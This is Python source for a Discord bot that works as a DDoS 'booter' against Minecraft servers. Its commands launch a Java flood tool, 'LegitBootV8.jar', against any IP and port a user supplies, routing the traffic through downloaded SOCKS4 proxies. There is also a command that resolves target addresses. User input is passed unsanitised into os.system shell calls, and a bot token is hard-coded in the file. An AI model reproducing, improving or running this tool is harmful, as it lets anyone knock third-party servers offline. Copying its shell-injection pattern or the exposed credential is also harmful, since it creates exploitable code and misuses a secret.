import discord
from discord.ext import commands
import os
import threading
import requests
import urllib.request
import json
import asyncio


client = commands.Bot(command_prefix = '>')
client.remove_command('help')

@client.event
async def on_ready():
    print("Matix skid i chuj")


@client.command()
async def proxy(ctx):
    def update():
        os.system('rm socks4.txt')
        os.system('wget https://api.openproxylist.xyz/socks4.txt')


    t1 = threading.Thread(target=update)

    t1.start()


@client.command()
async def handshake(ctx, arg1, arg2, arg3):

    def attack():
        os.system(f"screen -d -m java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 0 10 {arg3} 120 socks4.txt socks4")
        os.system(f"")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.orange()
    )


    t1 = threading.Thread(target=attack)

    t1.start()


@client.command()
@commands.has_permissions(manage_messages=True)
async def off(ctx):
    os.system("killall -9 java")
    embed = discord.Embed(
        title='Attack Stopped!',
        description=f'All Attack stopped successfully!',
        color=discord.Colour.orange()
    )

    await ctx.send(embed=embed)


@client.command()
async def join(ctx, arg1, arg2, arg3):


    def attack():
        os.system(f"screen -d -m java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 2 10 {arg3} 120 socks4.txt socks4")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='join', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/855793810118017044/863740346713899038/startup-icon-vector-id1074164928.png')
    embed.set_image(url=f'http://status.mclive.eu/McRange/{arg1}/{arg2}/banner.png')


    t1 = threading.Thread(target=attack)

    t1.start()

@client.command()
async def RandomBytes(ctx, arg1, arg2, arg3):


    def attack():
        os.system(f"screen -d -m java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 3 10 {arg3} 120 socks4.txt socks4")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='RandomBytes', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/855793810118017044/863740346713899038/startup-icon-vector-id1074164928.png')
    embed.set_image(url=f'http://status.mclive.eu/McRange/{arg1}/{arg2}/banner.png')


    t1 = threading.Thread(target=attack)

    t1.start()

@client.command()
async def Motd(ctx, arg1, arg2, arg3):


    def attack():
        os.system(f"screen -d -m java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 1 10 {arg3} 120 socks4.txt socks4")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='Motd', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/855793810118017044/863740346713899038/startup-icon-vector-id1074164928.png')
    embed.set_image(url=f'http://status.mclive.eu/McRange/{arg1}/{arg2}/banner.png')


    t1 = threading.Thread(target=attack)

    t1.start()

@client.command()
async def LongString(ctx, arg1, arg2, arg3):


    def attack():
        os.system(f"screen -d -m java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1}:{arg2} 4 10 {arg3} 120 socks4.txt socks4")

    embed = discord.Embed(
        title='Attack Sent!',
        description=f'Attack sent successfully!',
        color=discord.Colour.orange()
    )

    embed.add_field(name='ip:', value=f'{arg1}', inline=False)
    embed.add_field(name='port:', value=f'{arg2}', inline=False)
    embed.add_field(name='method:', value='LongString', inline=False)
    embed.add_field(name='protocol:', value=f'{arg3}', inline=False)
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/855793810118017044/863740346713899038/startup-icon-vector-id1074164928.png')
    embed.set_image(url=f'http://status.mclive.eu/McRange/{arg1}/{arg2}/banner.png')


    t1 = threading.Thread(target=attack)

    t1.start()

@client.command()
async def help(ctx):
    embed = discord.Embed(
        color=discord.Colour.red()
    )
    embed.add_field(name='join', value='>join ip port protocol')
    embed.add_field(name='RandomBytes', value='>RandomBytes ip port protocol', inline=False)
    embed.add_field(name='LongString', value='>LongString ip port protocol', inline=False)
    embed.add_field(name='Motd', value='>Motd ip port protocol', inline=False)
    embed.add_field(name='handshake', value='>handshake ip port protocol', inline=False)
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/855793810118017044/863740346713899038/startup-icon-vector-id1074164928.png')


@client.command()
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="resolved!",
        color=discord.Colour.red()
    )

    embed.add_field(name='Ip:', value=json_object["ip"], inline=False)
    embed.add_field(name='Port:', value=json_object["port"], inline=False)
    embed.add_field(name="Hostname:", value=json_object["hostname"], inline=False)
    embed.add_field(name="server online:", value=json_object["online"], inline=False)

    g = json_object["ip"]
    gb = json_object["port"]

    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/855793810118017044/863740346713899038/startup-icon-vector-id1074164928.png')
    embed.set_image(url=f'http://status.mclive.eu/McRange/{g}/{gb}/banner.png')



client.run('ODQzOTQ4NjQxNDU0NTIyMzY4.YKLSaw.EFFPzAdB44gfdQ2PFp0eFqmrcWU')
